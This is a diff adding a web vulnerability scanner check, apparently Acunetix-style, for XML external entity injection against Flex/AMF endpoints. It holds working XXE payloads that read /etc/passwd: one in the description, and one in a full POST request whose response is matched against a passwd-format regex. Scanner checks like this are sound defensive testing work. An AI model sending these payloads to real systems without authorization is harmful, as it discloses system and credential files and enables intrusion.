@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<WebApplicationTest>
+	<TestDescription name="XML external entity injection" version="0.1" released="20100223" updated="20150311" protocol="HTTP" mayproxy="true" affects="file" severity="high" alert="success" type="Configuration">
+		<WASPDescription BindAlertToFile="0" CrawlerProcessingMode="ParseOnly" TargetFormat="${file}" Target="" ModuleName="" Request="" Response="" FullResponse="" DetailsFormat="" Details="" AuthType="0" AuthName="" AuthPass="" CompInfo="" DetaliedInformation="" FolowRedirection="false" HasPrecondition="false" AlertTags="abuse_of_functionality,configuration,denial_of_service,information_disclosure,xxe" SendCookies="false" SendAuth="true" ValidateSession="false" CVE="" CWE="CWE-611" CVSSVer="2.0" CVSSScore="6.8" CVSSDescr="AV:N/AC:M/Au:N/C:P/I:P/A:P" CVSSScoreTemp="" CVSSScoreEnv="" CVSS3Descr="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"></WASPDescription>
+		<Copyright></Copyright>
+		<Description>XML supports a facility known as "external entities", which instruct an XML processor to retrieve and perform an inline include of XML located at a particular  URI. An external XML entity can be used to append or modify the document type declaration (DTD) associated with an XML document.  An  external XML entity can also be used to include XML within the  content of an XML document. [break][break]Now assume that the XML processor parses data originating from a source under attacker control. Most of the time the processor will not be validating, but it MAY include the replacement text thus initiating an unexpected file open operation, or HTTP transfer, or whatever system ids the XML
+ processor knows how to access. [break][break]below is a sample XML document that will use this functionality to include the contents of a local file (/etc/passwd)[break]
+[pre]
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE acunetix [
+  &lt;!ENTITY acunetixent SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;xxx&gt;&amp;acunetixent;&lt;/xxx&gt;
+[/pre]</Description>
+		<ApplicableTo>
+			<Platform>
+				<OS>All</OS>
+				<Arch>i386</Arch>
+			</Platform>
+			<WebServer>All</WebServer>
+			<ApplicationServer>All</ApplicationServer>
+		</ApplicableTo>
+		<TriggerOn event="scheme_host_port">
+			<Match type="regex">.*</Match>
+		</TriggerOn>
+		<Impact>Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests.</Impact>
+		<Recommendation>If possible it's recommended to disable parsing of XML external entities.</Recommendation>
+		<Reference database="CWE-611: Information Exposure Through XML External Entity Reference" URL="http://cwe.mitre.org/data/definitions/611.html"></Reference>
+		<Reference database="XXE (Xml eXternal Entity) attack" URL="http://archive.cert.uni-stuttgart.de/bugtraq/2002/10/msg00421.html"></Reference>
+		<Reference database="XML External Entity (XXE) Processing" URL="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing"></Reference>
+	</TestDescription>
+	<Connection scheme="${scheme}" host="${host}" port="${port}">
+		<Step name="first">
+			<Request>
+				<MessageHeader>
+					<Method>POST</Method>
+					<URI>${scheme}://${host}:${port}${file}</URI>
+					<Version>HTTP/1.0</Version>
+					<Header>
+						<Name encoding="text">Content-type</Name>
+						<Value encoding="text">application/x-amf</Value>
+					</Header>
+				</MessageHeader>
+				<MessageBody>
+					<Separator>\x0d\x0a</Separator>
+					<Item encoding="text">&lt;?xml version="1.0" encoding="utf-8"?&gt;</Item>
+					<Item encoding="text">&lt;!DOCTYPE test [ &lt;!ENTITY x3 SYSTEM "/etc/passwd"&gt; ]&gt;</Item>
+					<Item encoding="text">&lt;amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx"&gt;</Item>
+					<Item encoding="text">&lt;body&gt;</Item>
+					<Item encoding="text">&lt;object type="flex.messaging.messages.CommandMessage"&gt;</Item>
+					<Item encoding="text">&lt;traits&gt;</Item>
+					<Item encoding="text">&lt;string&gt;body&lt;/string&gt;&lt;string&gt;clientId&lt;/string&gt;&lt;string&gt;correlationId&lt;/string&gt;</Item>
+					<Item encoding="text">&lt;string&gt;destination&lt;/string&gt;&lt;string&gt;headers&lt;/string&gt;&lt;string&gt;messageId&lt;/string&gt;</Item>
+					<Item encoding="text">&lt;string&gt;operation&lt;/string&gt;&lt;string&gt;timestamp&lt;/string&gt;&lt;string&gt;timeToLive&lt;/string&gt;</Item>
+					<Item encoding="text">&lt;/traits&gt;&lt;object&gt;&lt;traits /&gt;</Item>
+					<Item encoding="text">&lt;/object&gt;</Item>
+					<Item encoding="text">&lt;null /&gt;&lt;string /&gt;&lt;string /&gt;</Item>
+					<Item encoding="text">&lt;object&gt;</Item>
+					<Item encoding="text">&lt;traits&gt;</Item>
+					<Item encoding="text">&lt;string&gt;DSId&lt;/string&gt;&lt;string&gt;DSMessagingVersion&lt;/string&gt;</Item>
+					<Item encoding="text">&lt;/traits&gt;</Item>
+					<Item encoding="text">&lt;string&gt;nil&lt;/string&gt;&lt;int&gt;1&lt;/int&gt;</Item>
+					<Item encoding="text">&lt;/object&gt;</Item>
+					<Item encoding="text">&lt;string&gt;&amp;x3;&lt;/string&gt;</Item>
+					<Item encoding="text">&lt;int&gt;5&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;</Item>
+					<Item encoding="text">&lt;/object&gt;</Item>
+					<Item encoding="text">&lt;/body&gt;</Item>
+					<Item encoding="text">&lt;/amfx&gt;</Item>
+				</MessageBody>
+			</Request>
+			<Response>
+				<SetVariable name="ResponseCode" type="string">
+					<Description>The HTTP Response Code</Description>
+					<Source source="status">^.*\s(\d\d\d)\s</Source>
+				</SetVariable>
+				<SetVariable name="etcpasswd" type="string">
+					<Description>check for solr response</Description>
+					<Source source="body">(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}</Source>
+				</SetVariable>
+			</Response>
+			<TestCriteria type="success">
+				<Compare variable="${ResponseCode}" test="eq">
+					<Value>200</Value>
+					<Compare variable="${IsCustom404}" test="eq">
+						<Value>false</Value>
+						<Compare variable="${etcpasswd}" test="neq">
+							<Value></Value>
+						</Compare>
+					</Compare>
+				</Compare>
+			</TestCriteria>
+			<TestCriteria type="failure">
+				<Compare variable="${ResponseCode}" test="neq">
+					<Value>200</Value>
+				</Compare>
+			</TestCriteria>
+		</Step>
+	</Connection>
+	<Variable name="file" type="string">
+		<Description>Affected site file</Description>
+		<Item encoding="Text">test</Item>
+	</Variable>
+</WebApplicationTest>
